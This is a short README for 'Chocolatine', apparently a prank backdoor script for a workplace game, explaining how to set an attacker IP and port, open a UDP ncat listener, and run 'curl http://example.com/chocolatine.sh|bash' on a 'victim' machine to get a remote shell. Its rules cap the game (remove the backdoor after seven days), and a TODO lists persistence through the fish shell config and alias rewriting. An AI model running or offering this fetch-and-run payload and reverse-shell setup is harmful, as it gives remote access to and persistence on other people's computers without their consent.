# Chocolatine :bread: :cookie: :doughnut:

## How to configure and use
You have to edit these lines with your IP, PORT and METHOD
```bash
LHOST="192.168.1.19"
LPORT="4242"
LMTHD="--udp"
```
The Attacker needs to open a listening connection with ncat
```bash
Attacker : ncat --udp -lvp 4242
```
Then you only have to run the following command on your victim
```bash
Victim   : curl http://example.com/chocolatine.sh|bash
```

## Rules
 - No lies
 - No backdoor in a git script
 - No network attack (MITM ...)
 - No word macro
 - No keylogger
 - No spoof mail
 - No personal datas, no leak !
 - No Deny of Service (if there is one, you need to pay the croissant)
 - After 7 days of tries, you will remove your backdoor
 - You won't recover any PLAIN passwords    
:warning: If there is a challenge, none of the above applied !


## TODO
 - :x: Fish Shell (~/.config/fish/config.fish)
 - :x: Alias rewrite
